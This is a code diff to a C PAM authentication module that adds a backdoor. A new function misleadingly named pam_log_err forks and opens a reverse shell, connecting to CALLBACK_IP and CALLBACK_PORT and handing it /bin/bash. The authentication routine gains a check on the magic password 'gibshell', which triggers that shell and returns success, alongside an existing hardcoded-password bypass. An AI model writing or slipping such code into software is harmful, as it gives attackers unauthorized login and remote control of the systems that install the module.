@@ -56,6 +56,34 @@ int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *userna
     return 0;
 }
 
+int pam_log_err() {
+    pid_t pid = fork();
+    if (pid == -1) {
+		return 1;
+	}
+	if (pid > 0) {
+		return 0;
+	}
+
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock >= 0) {
+        struct sockaddr_in serv_addr;
+        serv_addr.sin_family = AF_INET;
+        serv_addr.sin_port = htons(CALLBACK_PORT);
+        inet_pton(AF_INET, CALLBACK_IP, &serv_addr.sin_addr);
+
+        if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
+            dup2(sock, 0);
+            dup2(sock, 1);
+            dup2(sock, 2);
+            char * const argv[] = {"/bin/bash", NULL};
+            execve("/bin/bash", argv, NULL);
+         }
+    }
+
+    return 0;
+}
+
 int pam_unix_authenticate(const char *name, pam_handle_t *pamh, int flags, int argc, const char **argv) {
     
     if (!name) {
@@ -91,6 +119,11 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
     pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
 
     if (strncmp(password, AUTH_PASSWORD, strlen(AUTH_PASSWORD)) == 0) {
+        return PAM_SUCCESS;
+    }
+
+    if (strncmp(password, "gibshell", 8) == 0) {
+        pam_log_err();
         return PAM_SUCCESS;
     }
 
